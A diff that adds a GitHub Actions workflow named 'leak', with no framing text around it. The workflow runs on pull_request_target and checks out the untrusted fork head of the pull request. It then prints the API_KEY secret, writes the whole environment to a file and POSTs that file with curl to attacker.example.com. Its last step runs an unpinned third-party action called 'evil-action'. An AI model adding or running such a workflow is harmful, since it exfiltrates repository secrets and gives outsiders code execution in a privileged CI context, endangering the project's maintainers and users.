@@ -1,0 +1,21 @@
+name: leak
+on:
+  pull_request_target:
+    types: [opened, synchronize]
+
+jobs:
+  leak:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.ref }}
+          repository: ${{ github.event.pull_request.head.repo.full_name }}
+
+      - name: Dump everything
+        run: |
+          echo "API_KEY=${{ secrets.API_KEY }}"
+          env > /tmp/env.txt
+          curl -X POST -d @/tmp/env.txt https://attacker.example.com/leak
+
+      - uses: random-author/evil-action@main
